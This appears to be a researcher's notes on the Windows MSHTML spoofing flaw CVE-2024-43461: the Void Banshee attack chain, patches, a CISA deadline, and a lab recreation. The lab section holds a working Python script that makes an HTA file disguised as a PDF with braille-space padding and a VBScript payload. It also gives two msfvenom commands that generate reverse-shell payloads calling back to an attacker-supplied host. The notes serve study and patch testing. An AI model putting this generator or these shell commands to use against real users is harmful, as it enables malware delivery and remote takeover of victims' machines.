## [[CVE-2024-43461]] info
- Scored ==8.8/10==
- Reported on September 10 2024
- An attacker needs to convince a potential victim to visit a malicious Web page or to click on an unsafe link for any exploit to work.
- Used in an attack chain along with [[CVE-2024-38112]]
	- Rated 7.5/10
	- Used to craft .URL files that exploited defects inside the disabled internet explorer application. Typically zipped inside emails. URLs take user to compromised webpage that runs VBS scripts, runs powershell and fetch .NET loaders. "This loader operates within the RegAsm.exe process, ultimately deploying the [[Atlantida Stealer]]." [source](https://socprime.com/blog/detect-cve-2024-38112-exploitation-by-void-banshee-apt-in-zero-day-attacks-targeting-windows-users/) 
- Microsoft released 2 patches in July and September 2024. The July updated served to patch CVE-38112, the partner in the attack chain. 
	- KB5029263 (July)
	- KB5043064 (Sept) (Windows 10)

## Chained Attacks
- Attackers used [[CVE-2024-38112]] to navigate to an HTML landing page through Internet Explorer using the [[MHTML Protocol Handler]] inside of a .URL file. "This landing page contains an \<iframe\> which downloads an [[HTA File]] where the HTA extension is spoofed using CVE-2024-43461" to make the file appear to be a PDF to the victim. [source](https://www.darkreading.com/application-security/void-banshee-exploits-second-microsoft-zero-day)

## GPT
```
CVE-2024-43461 is a Windows vulnerability linked to the MSHTML engine, a component responsible for rendering web content. The flaw allows attackers to disguise malicious files, making them appear as safe ones (like PDFs) by manipulating the file extension. Specifically, attackers used braille whitespace characters in filenames to hide the real file extension—HTA (HTML Application). This tricked users into opening harmful files, believing them to be harmless documents.

The vulnerability was actively exploited by a cybercriminal group called Void Banshee. They used it to distribute malware that steals sensitive data, such as passwords and authentication tokens. The flaw was discovered in 2024 and patched in a Microsoft security update. However, even with the fix, the disguised file names could still mislead users, so it's essential to apply security updates and be cautious when handling files from untrusted sources​.
```
## [[MSHTML]]
- Trident (MSHTML) is a proprietary browser engine for the Microsoft Windows version of Internet Explorer, developed by Microsoft. MSHTML debuted with the release of Internet Explorer 4 in 1997
-  Although it's most commonly associated with Internet Explorer, it is also used in other software including versions of Skype, Microsoft Outlook, Visual Studio, and others.
- Microsoft continues to include in Windows for backward compatibility purposes.
## Who is Void Banshee
- Void Banshee is a financially motivated threat actor that researchers have observed targeting organizations in North America, Southeast Asia, and Europe.

## CISA
- Microsoft wants customers to apply its patches from both the July 2024 update and the September 2024 update to fully protect themselves against exploits targeting CVE-2024-43461. Following Microsoft's Sept. 13 update, the US Cybersecurity and Infrastructure Security Agency (CISA) [on Sept. 16 added the flaw](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) to its known exploited vulnerabilities database with a ==deadline of Oct. 7 for federal agencies== to implement the vendor's mitigations for it.
	- [source](https://www.darkreading.com/application-security/void-banshee-exploits-second-microsoft-zero-day)


## Exploring the Attack 
[Source](https://www.bleepingcomputer.com/news/security/windows-vulnerability-abused-braille-spaces-in-zero-day-attacks/)

The files may be delivered in a variety of ways, however As shown below, whitespace is injected using a sequence of whitespace characters to obfuscate the true file extensions. As seen, the it looks as if the file name is terminated after ".pdf" however, **ellipses (...)** can be seen to the far right indicating that file name trails on and is truncated. 
```
Books_A0UJKO.pdf%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80.hta
```

Above, we can see that the sequence `%E2%A0%80` is repeated 26 times to obfuscate the real extensions as seen below. This creates the character found [here](https://www.compart.com/en/unicode/U+2800). (U+2800)

![[Whtiespace Attack Example.png]]

Supposedly after the September patch this is how the same prompt would appear. Notice that the white space is not removed, however the prompt appears more like a warning. In my opinion this might not stop non-technical people from saving this file. 
![[Whitespace Attack Patched.png]]


## Exploiting it ourselves
Let's recreate this exploit to make sure it works and to see the steps which we would have to secure it. Additionally, we will also boot up a newer version  of the software and see what kind of changes the Microsoft patches have made. I will be using a windows 10 build Version 21H2 OS Build 19044.12888. To verify how the patch behaves, I will be using a cloned version of this VM with patch KB5043064 to observe its behaviour. Base machine:
![[Base VM build.png]]

### Recreating the exploit
To recreate this exploit, I figured it would be best to do most of it within a script, so that we can comment section and clearly view how each part of the exploit works. For the scripting language I chose Python. 

I will proceed the code with a few references that I used to help create it. 
- source 1

```
import urllib.parse

# Number of times braile spaces to be repeated
spaces = 50

# Encoded filename
encoded_filename = "Book.pdf" + "%E2%A0%80"*spaces + ".hta"

# Decode the URL-encoded characters
decoded_filename = urllib.parse.unquote(encoded_filename)

# Create a file with the decoded filename
with open(decoded_filename, 'w') as f:

    # Create HTML 
    f.write("""<html>
  <head>
    <title>CVE-2024-43461</title>
  </head>
  <body>
    <h2>Summoning the calculator</h2>
  </body>""")

    # Payload
    f.write("""<script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>""")

    #Finalize HTML
    f.write("""</html>""")

print(f"File created with the name: {decoded_filename}")
```

#### File Name
As can be seen above, I utilized the same pattern of `%E2%A0%80` special characters and added a space repeating variable to test how the spacing effects its visibility. 

#### Payload  
[[HTA File]]s can be especially dangerous due to their ability to use scripting locally and access resources not available to browser scripts. These files have access to the following scripting languages:
- Visual Basic Script
- Javascript

Additionally they have access to the following Windows resources which can be especially dangerous when run in Administrator mode. 
- System Registry 
- Local Files
- Memory 
- COM objects 
- ActiveX objects 

##### Msfvenom
Here are a couple ways you could create a shell with msfvenom and this exploit: 
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f vbs --arch x86 --platform win
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o shell.hta
```

### Viewing the Patches
For the patched machine, lets observe the behavior of our exploit. First lets verify that it has indeed been patched: 

![[Patched VM build.png]]

Preliminary results show that the article is accurate in its description and screenshots. 